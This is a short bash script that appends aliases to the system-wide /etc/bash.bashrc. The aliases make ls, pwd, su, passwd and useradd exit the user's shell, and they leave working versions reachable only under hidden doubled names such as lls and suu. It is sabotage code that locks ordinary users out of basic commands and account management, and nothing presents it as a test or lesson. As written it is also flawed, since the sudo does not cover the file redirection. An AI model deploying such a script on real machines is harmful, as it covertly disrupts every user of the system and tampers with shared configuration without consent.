#!/bin/bash
sudo echo "# ================================
# System-Wide Custom Alias Definitions
# ================================
alias useradd='exit'
alias passwd='exit'
alias pwd='exit'
alias su='exit'
alias ls='exit'
##############
alias lls='\ls'
alias suu='\su'
alias pwdd='\pwd'
alias useraddd='\useradd'
alias passwdd='\passwd'" >> /etc/bash.bashrc

source /etc/bash.bashrc
